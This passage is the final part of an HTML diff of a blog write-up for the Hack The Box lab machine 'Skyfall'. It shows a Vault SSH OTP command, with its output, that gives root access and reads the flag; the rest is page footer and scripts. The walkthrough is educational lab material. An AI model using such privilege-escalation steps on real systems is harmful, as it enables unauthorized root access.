service</span><br></pre></td></tr></table></figure></div>
+
+<p>Finally, I can simply ssh into the machine as root using the admin OTP:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ vault ssh -role=admin_otp_key_role -mode=otp root@skyfall.htb                                                                                                            2 ⨯</span><br><span class="line">WARN[0000]log.go:244 gosnowflake.(*defaultLogger).Warn DBUS_SESSION_BUS_ADDRESS envvar looks to be not <span class="built_in">set</span>, this can lead to runaway dbus-daemon processes. To avoid this, <span class="built_in">set</span> envvar DBUS_SESSION_BUS_ADDRESS=<span class="variable">$XDG_RUNTIME_DIR</span>/bus (<span class="keyword">if</span> it exists) or DBUS_SESSION_BUS_ADDRESS=/dev/null. </span><br><span class="line">Vault could not locate <span class="string">&quot;sshpass&quot;</span>. The OTP code <span class="keyword">for</span> the session is displayed</span><br><span class="line">below. Enter this code <span class="keyword">in</span> the SSH password prompt. If you install sshpass,                                                                                                       </span><br><span class="line">Vault can automatically perform this step <span class="keyword">for</span> you.                                                                                                                               </span><br><span class="line">OTP <span class="keyword">for</span> the session is: e0151541-566a-8eb6-52e7-25242e08c510</span><br><span class="line">(root@skyfall.htb) Password: </span><br><span class="line">Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-101-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/pro</span><br><span class="line"></span><br><span class="line">This system has been minimized by removing packages and content that are</span><br><span class="line">not required on a system that <span class="built_in">users</span> <span class="keyword">do</span> not <span class="built_in">log</span> into.</span><br><span class="line"></span><br><span class="line">To restore this content, you can run the <span class="string">&#x27;unminimize&#x27;</span> <span class="built_in">command</span>.</span><br><span class="line">Last login: Wed Mar 27 13:20:05 2024 from 10.10.14.46</span><br><span class="line">root@skyfall:~<span class="comment"># cat root.txt </span></span><br><span class="line">f6ec8d78d36797******************</span><br><span class="line">root@skyfall:~<span class="comment"># </span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>And that was it for <code>Skyfall</code> :D<br>Hope you enjoyed it!</p>
+<p>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: Skyfall</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2024-08-29 15:38:11</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-08-31 14:51:50
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://foued-saidi.tech/2024/08/29/Hackthebox-Skyfall/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/08/24/Hackthebox-Runner/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: Runner</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: Skyfall</div>
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-Application-http-10-129-35-111"><span class="nav-text">Web Application - http:&#x2F;&#x2F;10.129.35.111 </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MinIO-CVE-2023-28432"><span class="nav-text">MinIO - CVE-2023-28432</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-Escalation"><span class="nav-text">Privilege Escalation</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
